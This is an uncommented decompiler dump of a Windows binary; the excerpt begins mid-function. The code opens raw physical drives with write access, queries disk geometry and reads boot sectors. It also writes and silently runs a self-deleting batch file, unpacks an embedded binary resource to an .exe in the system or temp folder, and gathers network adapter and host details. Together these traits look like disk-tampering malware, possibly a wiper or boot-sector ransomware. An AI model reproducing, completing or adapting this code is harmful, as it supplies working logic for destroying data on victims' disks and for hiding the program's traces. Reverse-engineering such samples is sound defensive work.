  undefined uStack_9;
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  iVar1 = FUN_0040841e(param_1,param_2);
  if (iVar1 == 0) {
    local_224 = L'\0';
    _memset(local_222,0,0x206);
    local_42c = L'\0';
    _memset(local_42a,0,0x206);
    FUN_004083c4();
    _wcscat_s(&local_224,0x104,(wchar_t *)&DAT_0041dc88);
    local_1c = 0;
    local_1b = 0;
    uStack_17 = 0;
    uStack_13 = 0;
    uStack_f = 0;
    uStack_b = 0;
    this = &DAT_00424700;
    uStack_9 = 0;
    _Src = &DAT_00424700;
    do {
      if (*_Src != L'\0') {
        _wcscpy_s(&local_42c,0x104,&local_224);
        _wcscat_s(&local_42c,0x104,_Src);
        iVar1 = FUN_004046f8(&local_1c,&local_42c);
        if ((iVar1 != 0) && (iVar1 = _memcmp(&local_1c,_Src + 0x82,0x14), iVar1 == 0)) {
          *_Src = L'\0';
        }
      }
      _Src = _Src + 0x8c;
    } while ((int)_Src < 0x424c78);
    do {
      if (*this != 0) {
        _DAT_004246f4 = *(undefined4 *)(this + 0x80);
        FUN_00408656(this,param_1,param_2);
      }
      this = this + 0x8c;
    } while ((int)this < 0x424c78);
    _wcscat_s(&local_224,0x104,(wchar_t *)&DAT_00425340);
    GetFileAttributesW(&local_224);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_004028a3(wchar_t *param_1,wchar_t *param_2)

{
  _vswprintf_s(param_1,0x104,param_2,&stack0x0000000c);
  return;
}



ulonglong FUN_004028be(undefined4 param_1)

{
  undefined4 extraout_ECX;
  undefined4 extraout_EDX;
  ulonglong uVar1;
  
  _rand();
  uVar1 = FUN_00417410(extraout_ECX,extraout_EDX);
  return uVar1;
}



void __cdecl FUN_004028ec(undefined4 param_1,undefined4 param_2,int param_3)

{
  int iVar1;
  int iVar2;
  int *piVar3;
  int iVar4;
  ulonglong uVar5;
  int local_78 [4];
  undefined4 local_68;
  undefined4 local_58;
  undefined4 local_40;
  undefined4 local_28;
  undefined4 local_18;
  int local_10;
  int local_c;
  
  piVar3 = local_78;
  for (iVar2 = 0x1a; iVar2 != 0; iVar2 = iVar2 + -1) {
    *piVar3 = -1;
    piVar3 = piVar3 + 1;
  }
  local_18 = 1;
  local_28 = 1;
  local_40 = 1;
  local_58 = 1;
  local_68 = 1;
  local_78[0] = 1;
  uVar5 = FUN_004028be(param_1);
  local_10 = (int)uVar5;
  iVar2 = 0;
  local_c = 0;
  if (0 < local_10) {
    do {
      uVar5 = FUN_004028be(0);
      iVar4 = (int)uVar5;
      while( true ) {
        iVar1 = FUN_0040b724(local_78[iVar4] + iVar2);
        if (iVar1 < 2) break;
        iVar4 = iVar4 + 1;
        if (iVar4 == 0x1a) {
          iVar4 = 0;
        }
      }
      iVar2 = iVar2 + local_78[iVar4];
      *(short *)(param_3 + local_c * 2) = (short)iVar4 + 0x61;
      local_c = local_c + 1;
    } while (local_c < local_10);
  }
  return;
}



void * __cdecl FUN_00402974(DWORD *param_1)

{
  HMODULE hModule;
  HRSRC hResInfo;
  DWORD _Size;
  HGLOBAL hResData;
  void *_Src;
  void *_Dst;
  
  _Dst = (void *)0x0;
  hModule = GetModuleHandleW((LPCWSTR)0x0);
  hResInfo = FindResourceW(hModule,(LPCWSTR)0x83,u_IDR_BINARY_0041ddf8);
  if (hResInfo != (HRSRC)0x0) {
    _Size = SizeofResource(hModule,hResInfo);
    hResData = LoadResource(hModule,hResInfo);
    _Src = (void *)SetHandleCount((UINT)hResData);
    *param_1 = _Size;
    _Dst = operator_new(_Size);
    _memset(_Dst,0,_Size);
    _memcpy(_Dst,_Src,_Size);
    FreeResource(hResData);
  }
  return _Dst;
}



LPWSTR __cdecl FUN_004029e7(char *param_1,LPWSTR param_2)

{
  int iVar1;
  size_t local_8;
  
  iVar1 = 0x20;
  local_8 = _strlen(param_1);
  if (param_2 == (LPWSTR)0x0) {
    iVar1 = MultiByteToWideChar(0,0,param_1,-1,(LPWSTR)0x0,0);
    param_2 = (LPWSTR)_malloc(iVar1 * 2);
  }
  if (local_8 == 0) {
    *param_2 = L'\0';
  }
  else {
    if ((0 < iVar1) && ((int)(iVar1 - 1U) < (int)local_8)) {
      local_8 = iVar1 - 1U;
    }
    MultiByteToWideChar(0,0,param_1,-1,param_2,local_8 + 1);
  }
  return param_2;
}



undefined4 __cdecl FUN_00402a59(wchar_t *param_1,LPWSTR param_2)

{
  wchar_t *_Dst;
  uint netlong;
  hostent *phVar1;
  int iVar2;
  wchar_t **ppwVar3;
  wchar_t *local_34 [10];
  u_long local_c;
  int local_8;
  
  ppwVar3 = local_34;
  local_34[0] = (wchar_t *)0x0;
  for (iVar2 = 9; ppwVar3 = ppwVar3 + 1, iVar2 != 0; iVar2 = iVar2 + -1) {
    *ppwVar3 = (wchar_t *)0x0;
  }
  local_8 = 0;
  iVar2 = 0;
  do {
    _Dst = (wchar_t *)operator_new(0x20);
    local_34[iVar2] = _Dst;
    _memset(_Dst,0,0x20);
    iVar2 = iVar2 + 1;
  } while (iVar2 < 10);
  iVar2 = FUN_00409dc5(param_1);
  if ((iVar2 == 0) || (param_1 == (wchar_t *)0x0)) {
    FUN_00402b08((void *)0x0,(int)local_34,&local_8);
    if (local_8 == 0) {
      return 0;
    }
  }
  else {
    _wcscpy_s(local_34[0],0x10,param_1);
  }
  netlong = FUN_00402cf4(local_34[0]);
  local_c = ntohl(netlong);
  phVar1 = gethostbyaddr((char *)&local_c,4,2);
  if (phVar1 == (hostent *)0x0) {
    return 0;
  }
  FUN_004029e7(phVar1->h_name,param_2);
  return 1;
}



void __cdecl FUN_00402b08(void *param_1,int param_2,int *param_3)

{
  undefined4 *puVar1;
  int iVar2;
  size_t sVar3;
  uint uVar4;
  int iVar5;
  size_t sVar6;
  undefined4 *puVar7;
  bool bVar8;
  size_t local_34;
  int local_30;
  undefined4 *local_2c;
  wchar_t local_28;
  undefined4 local_26 [7];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  local_30 = -1;
  local_28 = L'\0';
  puVar7 = local_26;
  for (iVar5 = 7; iVar5 != 0; iVar5 = iVar5 + -1) {
    *puVar7 = 0;
    puVar7 = puVar7 + 1;
  }
  *(undefined2 *)puVar7 = 0;
  iVar5 = 0;
  local_2c = (undefined4 *)_malloc(0x288);
  local_34 = 0x288;
  iVar2 = GetAdaptersInfo(local_2c,&local_34);
  if (iVar2 == 0x6f) {
    _free(local_2c);
    local_2c = (undefined4 *)_malloc(local_34);
  }
  puVar7 = local_2c;
  iVar2 = GetAdaptersInfo(local_2c,&local_34);
  if (iVar2 == 0) {
    for (; puVar7 != (undefined4 *)0x0; puVar7 = (undefined4 *)*puVar7) {
      local_30 = local_30 + 1;
      if (param_1 != (void *)0x0) {
        _memcpy(param_1,puVar7 + 0x65,6);
      }
      for (puVar1 = puVar7 + 0x6b; puVar1 != (undefined4 *)0x0; puVar1 = (undefined4 *)*puVar1) {
        sVar3 = _strlen((char *)(puVar1 + 1));
        if (0x10 < (int)sVar3) {
          sVar3 = 0x10;
        }
        sVar6 = 0;
        if (-1 < (int)sVar3) {
          bVar8 = sVar3 == 0;
          do {
            if (bVar8) {
              *(undefined2 *)((int)local_26 + sVar6 * 2 + -2) = 0;
            }
            *(short *)((int)local_26 + sVar6 * 2 + -2) = (short)*(char *)((int)(puVar1 + 1) + sVar6)
            ;
            sVar6 = sVar6 + 1;
            bVar8 = sVar6 == sVar3;
          } while ((int)sVar6 <= (int)sVar3);
        }
        uVar4 = FUN_00402cf4(&local_28);
        if (uVar4 != 0) {
          _wcscpy_s(*(wchar_t **)(param_2 + iVar5 * 4),0x10,&local_28);
        }
        iVar5 = iVar5 + 1;
      }
      if (0 < iVar5) break;
    }
  }
  *param_3 = iVar5;
  if (local_2c != (undefined4 *)0x0) {
    _free(local_2c);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



int __cdecl FUN_00402c5a(int param_1)

{
  wchar_t **ppwVar1;
  wchar_t *in_EAX;
  int iVar2;
  wchar_t *pwVar3;
  int iVar4;
  size_t _Count;
  
  iVar4 = 0;
  iVar2 = FUN_00409dc5(in_EAX);
  if (iVar2 != 0) {
    pwVar3 = _wcsstr(in_EAX,(wchar_t *)&DAT_0041de34);
    while (pwVar3 != (wchar_t *)0x0) {
      _Count = (int)pwVar3 - (int)in_EAX >> 1;
      if (0xf < (int)_Count) {
        _Count = 0xf;
      }
      ppwVar1 = (wchar_t **)(param_1 + iVar4 * 4);
      _wcsncpy(*ppwVar1,in_EAX,_Count);
      in_EAX = pwVar3 + 1;
      iVar4 = iVar4 + 1;
      (*ppwVar1)[_Count] = L'\0';
      pwVar3 = _wcsstr(in_EAX,(wchar_t *)&DAT_0041de34);
    }
    _wcscpy_s(*(wchar_t **)(param_1 + iVar4 * 4),0xf,in_EAX);
    iVar2 = iVar4 + 1;
  }
  return iVar2;
}



uint FUN_00402cf4(undefined4 param_1)

{
  wchar_t *_Dst;
  uint uVar1;
  int iVar2;
  longlong lVar3;
  longlong lVar4;
  longlong lVar5;
  wchar_t *local_1c [4];
  uint local_c;
  wchar_t *local_8;
  
  local_1c[0] = (wchar_t *)0x0;
  local_1c[1] = (wchar_t *)0x0;
  local_1c[2] = (wchar_t *)0x0;
  local_1c[3] = (wchar_t *)0x0;
  iVar2 = 0;
  do {
    _Dst = (wchar_t *)operator_new(0x20);
    local_1c[iVar2] = _Dst;
    _memset(_Dst,0,0x20);
    iVar2 = iVar2 + 1;
  } while (iVar2 < 4);
  iVar2 = FUN_00402c5a((int)local_1c);
  if (iVar2 == 4) {
    lVar3 = __wcstoi64(local_1c[0],&local_8,10);
    lVar4 = __wcstoi64(local_1c[1],&local_8,10);
    lVar5 = __wcstoi64(local_1c[2],&local_8,10);
    local_c = (uint)lVar5;
    lVar5 = __wcstoi64(local_1c[3],&local_8,10);
    uVar1 = (uint)lVar5 | (((int)lVar3 << 8 | (uint)lVar4) << 8 | local_c) << 8;
    iVar2 = 0;
    do {
      if (local_1c[iVar2] != (wchar_t *)0x0) {
        FUN_0040b579(local_1c[iVar2]);
      }
      iVar2 = iVar2 + 1;
    } while (iVar2 < 4);
  }
  else {
    uVar1 = 0;
  }
  return uVar1;
}



void FUN_00402db0(void)

{
  int iVar1;
  wchar_t *unaff_ESI;
  undefined4 *puVar2;
  wchar_t local_28;
  undefined4 local_26 [7];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  local_28 = L'\0';
  puVar2 = local_26;
  for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  *(undefined2 *)puVar2 = 0;
  FUN_00403111(&local_28,u__d__d__d__d_0041de38);
  _wcscpy_s(unaff_ESI,0x10,&local_28);
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_00402e15(void)

{
  char *unaff_ESI;
  char local_18;
  undefined4 local_17;
  undefined4 uStack_13;
  undefined4 uStack_f;
  undefined2 uStack_b;
  undefined uStack_9;
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  local_18 = '\0';
  local_17 = 0;
  uStack_13 = 0;
  uStack_f = 0;
  uStack_b = 0;
  uStack_9 = 0;
  FUN_00403129(&local_18,s__d__d__d__d_0041de50);
  _strcpy_s(unaff_ESI,0x10,&local_18);
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_00402e79(void)

{
  undefined local_124 [128];
  undefined local_a4 [156];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)(local_124 + 0x80);
  _memset(local_124 + 4,0,0x118);
  local_124._0_4_ = 0x11c;
  GetVersionExW((LPOSVERSIONINFOW)local_124);
  ___security_check_cookie_4(local_8 ^ (uint)(local_124 + 0x80));
  return;
}



undefined8 __cdecl FUN_00402f15(LPCWSTR param_1)

{
  HANDLE hFile;
  BOOL BVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  LARGE_INTEGER local_10;
  
  uVar3 = 0xffffffff;
  hFile = CreateFileW(param_1,0x80000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  if (hFile == (HANDLE)0xffffffff) {
    uVar2 = -1;
  }
  else {
    BVar1 = GetFileSizeEx(hFile,&local_10);
    uVar2 = -1;
    if (BVar1 == 1) {
      uVar2 = local_10.s.HighPart;
      uVar3 = local_10.s.LowPart;
    }
    CloseHandle(hFile);
  }
  return CONCAT44(uVar2,uVar3);
}



void __fastcall FUN_00402f6a(void *param_1)

{
  wchar_t *_Dst;
  uint uVar1;
  int iVar2;
  wchar_t **ppwVar3;
  wchar_t *local_78 [10];
  int local_50;
  undefined4 local_4c;
  WCHAR local_48;
  undefined local_46 [62];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  ppwVar3 = local_78;
  local_78[0] = (wchar_t *)0x0;
  for (iVar2 = 9; ppwVar3 = ppwVar3 + 1, iVar2 != 0; iVar2 = iVar2 + -1) {
    *ppwVar3 = (wchar_t *)0x0;
  }
  local_50 = 0;
  local_4c = 0;
  _memset(param_1,0,0xa0);
  iVar2 = 0;
  do {
    _Dst = (wchar_t *)operator_new(0x20);
    local_78[iVar2] = _Dst;
    _memset(_Dst,0,0x20);
    iVar2 = iVar2 + 1;
  } while (iVar2 < 10);
  FUN_00402b08((void *)((int)param_1 + 0x4a),(int)local_78,&local_50);
  if (0 < local_50) {
    uVar1 = FUN_00402cf4(local_78[0]);
    *(uint *)((int)param_1 + 0x50) = uVar1;
    local_48 = L'\0';
    _memset(local_46,0,0x3e);
    iVar2 = FUN_00402a59(local_78[0],&local_48);
    if (iVar2 == 1) {
      _wcscpy_s((wchar_t *)((int)param_1 + 0x58),0x21,&local_48);
      local_4c = 1;
    }
    else {
      local_4c = 0;
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_0040303a(void)

{
  LPWSTR unaff_EBX;
  WCHAR local_210;
  undefined local_20e [518];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  local_210 = L'\0';
  _memset(local_20e,0,0x206);
  if (DAT_00423040 == 3) {
    GetSystemDirectoryW(&local_210,0x104);
    _wcscat_s(&local_210,0x104,(wchar_t *)&DAT_0041dc88);
  }
  else {
    GetTempPathW(0x104,&local_210);
  }
  wsprintfW(unaff_EBX,u__s_s_exe_0041dca8,&local_210);
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_004030cf(size_t param_1)

{
  DWORD DVar1;
  int iVar2;
  void *unaff_EBX;
  int iVar3;
  int iVar4;
  
  iVar4 = 0;
  _memset(unaff_EBX,0,param_1);
  iVar3 = (int)(param_1 + ((int)param_1 >> 0x1f & 3U)) >> 2;
  DVar1 = GetTickCount();
  FUN_00408e77(DVar1);
  if (0 < iVar3) {
    do {
      iVar2 = _rand();
      *(int *)((int)unaff_EBX + iVar4 * 4) = iVar2;
      iVar4 = iVar4 + 1;
    } while (iVar4 < iVar3);
  }
  return;
}



void __cdecl FUN_00403111(wchar_t *param_1,wchar_t *param_2)

{
  _vswprintf_s(param_1,0x10,param_2,&stack0x0000000c);
  return;
}



void __cdecl FUN_00403129(char *param_1,char *param_2)

{
  _vsprintf_s(param_1,0x10,param_2,&stack0x0000000c);
  return;
}



void FUN_00403141(void)

{
  char *pcVar1;
  size_t sVar2;
  size_t sVar3;
  size_t sVar4;
  DWORD *lpNumberOfBytesWritten;
  LPOVERLAPPED lpOverlapped;
  DWORD local_320;
  HANDLE local_31c;
  uint local_318;
  char local_314 [116];
  undefined local_2a0 [144];
  CHAR local_210 [260];
  CHAR local_10c [260];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)local_2a0;
  local_320 = 0;
  GetTempPathA(0x104,local_10c);
  _strcat_s(local_10c,0x104,s__vslite_bat_0041de60);
  GetModuleFileNameA((HMODULE)0x0,local_210,0x104);
  _strcpy_s(local_314,0x104,local_210);
  pcVar1 = _strrchr(local_314,0x5c);
  if (pcVar1 != (char *)0x0) {
    *pcVar1 = '\0';
  }
  local_31c = CreateFileA(local_10c,0x40000000,0,(LPSECURITY_ATTRIBUTES)0x0,2,0x80,(HANDLE)0x0);
  if (local_31c != (HANDLE)0xffffffff) {
    sVar2 = _strlen(local_210);
    sVar3 = _strlen(s__Repeat_del___s__if_exist___s__g_004235f0);
    sVar4 = _strlen(local_10c);
    local_318 = sVar4 + 0x32 + sVar2 * 3 + sVar3;
    pcVar1 = (char *)operator_new(local_318);
    _memset(pcVar1,0,local_318);
    _sprintf_s(pcVar1,local_318,s__Repeat_del___s__if_exist___s__g_004235f0,local_210,local_210,
               local_314,local_10c);
    lpOverlapped = (LPOVERLAPPED)0x0;
    lpNumberOfBytesWritten = &local_320;
    sVar2 = _strlen(pcVar1);
    WriteFile(local_31c,pcVar1,sVar2,lpNumberOfBytesWritten,lpOverlapped);
    CloseHandle(local_31c);
    ShellExecuteA((HWND)0x0,&DAT_0041de6c,local_10c,(LPCSTR)0x0,(LPCSTR)0x0,0);
    if (pcVar1 != (char *)0x0) {
      FUN_0040b579(pcVar1);
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)local_2a0);
  return;
}



BOOL __cdecl FUN_004032a4(HANDLE param_1,uint param_2,LPVOID param_3)

{
  BOOL BVar1;
  _OVERLAPPED local_1c;
  DWORD local_8;
  
  BVar1 = 0;
  local_1c.Internal = 0;
  local_1c.InternalHigh = 0;
  local_1c.hEvent = (HANDLE)0x0;
  local_8 = 0;
  if (param_1 != (HANDLE)0xffffffff) {
    local_1c.u = (_union_518)((ulonglong)param_2 * 0x200);
    BVar1 = ReadFile(param_1,param_3,0x400,&local_8,&local_1c);
  }
  return BVar1;
}



void __cdecl FUN_004032f2(int param_1)

{
  int iVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  DWORD dwDesiredAccess;
  undefined4 local_44 [9];
  undefined4 local_20;
  wchar_t local_1c;
  undefined4 local_1a;
  undefined4 uStack_16;
  undefined4 uStack_12;
  undefined4 uStack_e;
  undefined2 uStack_a;
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  puVar2 = (undefined4 *)u_____PHYSICALDRIVE_0041de74;
  puVar3 = local_44;
  for (iVar1 = 9; iVar1 != 0; iVar1 = iVar1 + -1) {
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  local_20 = 0;
  local_1c = L'\0';
  local_1a = 0;
  uStack_16 = 0;
  uStack_12 = 0;
  uStack_e = 0;
  uStack_a = 0;
  if (-1 < param_1) {
    __itow_s(param_1,&local_1c,10,10);
    _wcscat_s((wchar_t *)local_44,0x14,&local_1c);
    if (param_1 == 0) {
      dwDesiredAccess = 0x80000000;
    }
    else {
      dwDesiredAccess = 0xc0000000;
    }
    CreateFileW((LPCWSTR)local_44,dwDesiredAccess,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_00403384(short param_1,undefined4 *param_2)

{
  HANDLE hDevice;
  BOOL BVar1;
  int iVar2;
  undefined4 *puVar3;
  undefined8 uVar4;
  DWORD local_444;
  undefined4 *local_440;
  undefined4 local_43c;
  undefined local_438 [8];
  undefined4 local_430;
  uint local_428;
  uint local_424;
  wchar_t local_38;
  undefined4 local_36 [9];
  undefined4 local_10;
  undefined2 uStack_c;
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  local_10 = DAT_0041de98;
  local_440 = param_2;
  uStack_c = DAT_0041de9c;
  local_38 = L'\0';
  puVar3 = local_36;
  for (iVar2 = 9; iVar2 != 0; iVar2 = iVar2 + -1) {
    *puVar3 = 0;
    puVar3 = puVar3 + 1;
  }
  *(undefined2 *)puVar3 = 0;
  local_10 = CONCAT22(local_10._2_2_,(short)local_10 + param_1);
  local_43c = 0;
  FUN_0040352a(&local_38,u______s_0041dea0);
  hDevice = CreateFileW(&local_38,0x80000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  if (hDevice != (HANDLE)0xffffffff) {
    BVar1 = DeviceIoControl(hDevice,0x560000,(LPVOID)0x0,0,local_438,0x400,&local_444,
                            (LPOVERLAPPED)0x0);
    if (BVar1 != 0) {
      uVar4 = __alldiv(local_428,local_424,0x200,0);
      local_43c = (undefined4)uVar4;
      *local_440 = local_430;
    }
  }
  if (hDevice != (HANDLE)0x0) {
    CloseHandle(hDevice);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



undefined4 __cdecl FUN_00403471(HANDLE param_1)

{
  uint uVar1;
  BOOL BVar2;
  uint *puVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  undefined8 uVar7;
  uint local_1c;
  uint local_18;
  DWORD local_10;
  undefined4 local_c;
  void *local_8;
  
  Sleep(100);
  uVar6 = 0;
  uVar5 = 0;
  local_c = 0;
  local_1c = 0;
  local_18 = 0;
  if (param_1 != (HANDLE)0xffffffff) {
    local_8 = operator_new(0xc00);
    BVar2 = DeviceIoControl(param_1,0x70050,(LPVOID)0x0,0,local_8,0xc00,&local_10,(LPOVERLAPPED)0x0)
    ;
    if (BVar2 != 0) {
      puVar3 = (uint *)((int)local_8 + 0x38);
      iVar4 = 4;
      do {
        uVar1 = puVar3[1];
        if (((int)local_18 <= (int)uVar1) && (((int)local_18 < (int)uVar1 || (local_1c < *puVar3))))
        {
          uVar5 = puVar3[2];
          uVar6 = puVar3[3];
          local_1c = *puVar3;
          local_18 = uVar1;
        }
        puVar3 = puVar3 + 0x24;
        iVar4 = iVar4 + -1;
      } while (iVar4 != 0);
      uVar7 = __alldiv(uVar5 + local_1c,uVar6 + local_18 + (uint)CARRY4(uVar5,local_1c),0x200,0);
      local_c = (undefined4)uVar7;
    }
    if (local_8 != (void *)0x0) {
      FUN_0040b579(local_8);
    }
  }
  Sleep(100);
  return local_c;
}



void __cdecl FUN_0040352a(wchar_t *param_1,wchar_t *param_2)

{
  _vswprintf_s(param_1,0x14,param_2,&stack0x0000000c);
  return;
}



undefined4 __cdecl FUN_00403542(HANDLE param_1,void *param_2)

{
  void *_Dst;
  uint uVar1;
  BOOL BVar2;
  int iVar3;
  undefined4 local_8;
  
  local_8 = 0;
  if (param_1 != (HANDLE)0xffffffff) {
    _Dst = operator_new(0x400);
    _memset(_Dst,0,0x400);
    uVar1 = FUN_00403471(param_1);
    BVar2 = FUN_004032a4(param_1,uVar1,_Dst);
    if (BVar2 != 0) {
      iVar3 = _memcmp((void *)((int)_Dst + 4),&DAT_0041deb0,4);
      if (((iVar3 == 0) && (iVar3 = FUN_00409dc5((short *)((int)_Dst + 0x10e)), iVar3 != 0)) ||
         ((BVar2 = FUN_004032a4(param_1,0x1e,_Dst), BVar2 != 0 &&
          ((iVar3 = _memcmp((void *)((int)_Dst + 4),&DAT_0041deb0,4), iVar3 == 0 &&
           (iVar3 = FUN_00409dc5((short *)((int)_Dst + 0x10e)), iVar3 != 0)))))) {
        local_8 = 1;
        _memcpy(param_2,_Dst,0x236);
      }
    }
    if (_Dst != (void *)0x0) {
      FUN_0040b579(_Dst);
    }
    return local_8;
  }
  return 0;
}



void FUN_00403612(void)

{
  HANDLE pvVar1;
  void *unaff_ESI;
  int local_218;
  WCHAR local_214;
  undefined local_212 [522];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  local_214 = L'\0';
  _memset(local_212,0,0x206);
  local_218 = 0;
  GetSystemDirectoryW(&local_214,0x104);
  FUN_00403384(local_214 + L'﾿',&local_218);
  pvVar1 = (HANDLE)FUN_004032f2(local_218);
  if (pvVar1 != (HANDLE)0xffffffff) {
    FUN_00403542(pvVar1,unaff_ESI);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_0040369f(void)

{
  int in_EAX;
  uint uVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  
  uVar2 = *(uint *)(in_EAX + 8);
  uVar3 = *(uint *)(in_EAX + 0xc);
  uVar8 = uVar3 >> 2 | uVar3 << 0x1e;
  uVar3 = (uVar2 >> 0x1b | uVar2 << 5) +
          ((*(uint *)(in_EAX + 0x14) ^ *(uint *)(in_EAX + 0x10)) & uVar3 ^ *(uint *)(in_EAX + 0x14))
          + *(int *)(in_EAX + 0x18) + 0x5a827999 + *(int *)(in_EAX + 0x1c);
  uVar1 = uVar2 >> 2 | uVar2 << 0x1e;
  uVar2 = *(int *)(in_EAX + 0x14) + 0x5a827999 +
          (uVar3 >> 0x1b | uVar3 * 0x20) +
          ((*(uint *)(in_EAX + 0x10) ^ uVar8) & uVar2 ^ *(uint *)(in_EAX + 0x10)) +
          *(int *)(in_EAX + 0x20);
  uVar4 = *(int *)(in_EAX + 0x10) + 0x5a827999 +
          ((uVar8 ^ uVar1) & uVar3 ^ uVar8) +
          (uVar2 >> 0x1b | uVar2 * 0x20) + *(int *)(in_EAX + 0x24);
  uVar6 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar5 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar3 = uVar8 + 0x5a827999 +
          (uVar4 >> 0x1b | uVar4 * 0x20) + ((uVar6 ^ uVar1) & uVar2 ^ uVar1) +
          *(int *)(in_EAX + 0x28);
  uVar8 = uVar4 >> 2 | uVar4 * 0x40000000;
  uVar2 = uVar1 + 0x5a827999 +
          (uVar3 >> 0x1b | uVar3 * 0x20) + ((uVar6 ^ uVar5) & uVar4 ^ uVar6) +
          *(int *)(in_EAX + 0x2c);
  uVar1 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = uVar6 + 0x5a827999 +
          (uVar2 >> 0x1b | uVar2 * 0x20) + ((uVar5 ^ uVar8) & uVar3 ^ uVar5) +
          *(int *)(in_EAX + 0x30);
  uVar4 = uVar5 + 0x5a827999 +
          (uVar3 >> 0x1b | uVar3 * 0x20) + ((uVar8 ^ uVar1) & uVar2 ^ uVar8) +
          *(int *)(in_EAX + 0x34);
  uVar6 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = uVar8 + 0x5a827999 +
          (uVar4 >> 0x1b | uVar4 * 0x20) + ((uVar1 ^ uVar6) & uVar3 ^ uVar1) +
          *(int *)(in_EAX + 0x38);
  uVar7 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar5 = uVar4 >> 2 | uVar4 * 0x40000000;
  uVar3 = uVar1 + 0x5a827999 +
          ((uVar7 ^ uVar6) & uVar4 ^ uVar6) +
          (uVar2 >> 0x1b | uVar2 * 0x20) + *(int *)(in_EAX + 0x3c);
  uVar4 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = uVar6 + 0x5a827999 +
          (uVar3 >> 0x1b | uVar3 * 0x20) + ((uVar7 ^ uVar5) & uVar2 ^ uVar7) +
          *(int *)(in_EAX + 0x40);
  uVar8 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = uVar7 + 0x5a827999 +
          (uVar2 >> 0x1b | uVar2 * 0x20) + ((uVar5 ^ uVar4) & uVar3 ^ uVar5) +
          *(int *)(in_EAX + 0x44);
  uVar1 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = uVar5 + 0x5a827999 +
          (uVar3 >> 0x1b | uVar3 * 0x20) + ((uVar4 ^ uVar8) & uVar2 ^ uVar4) +
          *(int *)(in_EAX + 0x48);
  uVar6 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = uVar4 + 0x5a827999 +
          (uVar2 >> 0x1b | uVar2 * 0x20) + ((uVar8 ^ uVar1) & uVar3 ^ uVar8) +
          *(int *)(in_EAX + 0x4c);
  uVar4 = uVar8 + 0x5a827999 +
          ((uVar6 ^ uVar1) & uVar2 ^ uVar1) +
          (uVar3 >> 0x1b | uVar3 * 0x20) + *(uint *)(in_EAX + 0x50);
  uVar7 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar5 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar2 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x3c) ^ *(uint *)(in_EAX + 0x24) ^
          *(uint *)(in_EAX + 0x1c);
  uVar3 = uVar1 + 0x5a827999 +
          (uVar4 >> 0x1b | uVar4 * 0x20) + ((uVar6 ^ uVar7) & uVar3 ^ uVar6) +
          *(int *)(in_EAX + 0x54);
  uVar8 = uVar4 >> 2 | uVar4 * 0x40000000;
  uVar1 = uVar2 << 1 | (uint)((int)uVar2 < 0);
  uVar2 = uVar6 + 0x5a827999 +
          (uVar3 >> 0x1b | uVar3 * 0x20) + ((uVar7 ^ uVar5) & uVar4 ^ uVar7) +
          *(int *)(in_EAX + 0x58);
  *(uint *)(in_EAX + 0x1c) = uVar1;
  uVar4 = uVar7 + 0x5a827999 +
          ((uVar5 ^ uVar8) & uVar3 ^ uVar5) + (uVar2 >> 0x1b | uVar2 * 0x20) + uVar1;
  uVar6 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x28) ^
          *(uint *)(in_EAX + 0x20);
  uVar3 = uVar3 << 1 | (uint)((int)uVar3 < 0);
  *(uint *)(in_EAX + 0x20) = uVar3;
